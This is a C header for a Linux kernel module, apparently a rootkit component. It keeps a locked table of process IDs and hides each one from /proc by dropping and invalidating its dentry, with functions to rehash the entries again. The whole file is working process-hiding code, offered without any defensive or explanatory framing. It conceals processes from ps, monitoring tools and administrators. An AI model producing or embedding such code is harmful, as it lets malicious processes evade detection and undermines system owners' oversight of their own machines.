#ifndef HIDE_PROCFS_DIR_H
#define HIDE_PROCFS_DIR_H

#include "linux_kernel_api.h"
#include "proc_root_auto_offset.h"

#define MAX_HIDDEN_PIDS 256

static int g_hidden_pids[MAX_HIDDEN_PIDS];
static int g_hidden_count;
static DEFINE_MUTEX(g_hidden_lock);

static bool is_pid_hidden(int pid)
{
    int i;
    bool ret = false;

    mutex_lock(&g_hidden_lock);
    for (i = 0; i < g_hidden_count; i++) {
        if (g_hidden_pids[i] == pid) {
            ret = true;
            break;
        }
    }
    mutex_unlock(&g_hidden_lock);
    return ret;
}

static int add_hidden_pid(int pid)
{
    int i;

    mutex_lock(&g_hidden_lock);
    for (i = 0; i < g_hidden_count; i++) {
        if (g_hidden_pids[i] == pid) {
            mutex_unlock(&g_hidden_lock);
            return 0;
        }
    }
    if (g_hidden_count >= MAX_HIDDEN_PIDS) {
        mutex_unlock(&g_hidden_lock);
        return -ENOSPC;
    }
    g_hidden_pids[g_hidden_count++] = pid;
    mutex_unlock(&g_hidden_lock);
    return 0;
}

static int remove_hidden_pid(int pid)
{
    int i, j;

    mutex_lock(&g_hidden_lock);
    for (i = 0; i < g_hidden_count; i++) {
        if (g_hidden_pids[i] == pid) {
            for (j = i; j < g_hidden_count - 1; j++)
                g_hidden_pids[j] = g_hidden_pids[j + 1];
            g_hidden_count--;
            mutex_unlock(&g_hidden_lock);
            return 0;
        }
    }
    mutex_unlock(&g_hidden_lock);
    return -ENOENT;
}

static int hide_procfs_pid(int pid)
{
    char path_buf[64];
    struct path p;
    int ret;

    snprintf(path_buf, sizeof(path_buf), "/proc/%d", pid);
    ret = kern_path(path_buf, 0, &p);
    if (ret) {
        pr_warn("hide_procfs: kern_path /proc/%d failed: %d\n", pid, ret);
        return ret;
    }

    d_drop(p.dentry);
    d_invalidate(p.dentry);
    path_put(&p);
    pr_info("hide_procfs: dropped /proc/%d\n", pid);
    return 0;
}

static int unhide_procfs_pid(int pid)
{
    char path_buf[64];
    struct path p;
    int ret;

    snprintf(path_buf, sizeof(path_buf), "/proc/%d", pid);
    ret = kern_path(path_buf, 0, &p);
    if (ret)
        return ret;

    d_rehash(p.dentry);
    path_put(&p);
    pr_info("hide_procfs: rehashed /proc/%d\n", pid);
    return 0;
}

static void unhide_all_pids(void)
{
    mutex_lock(&g_hidden_lock);
    while (g_hidden_count > 0) {
        g_hidden_count--;
        unhide_procfs_pid(g_hidden_pids[g_hidden_count]);
    }
    mutex_unlock(&g_hidden_lock);
}

#endif
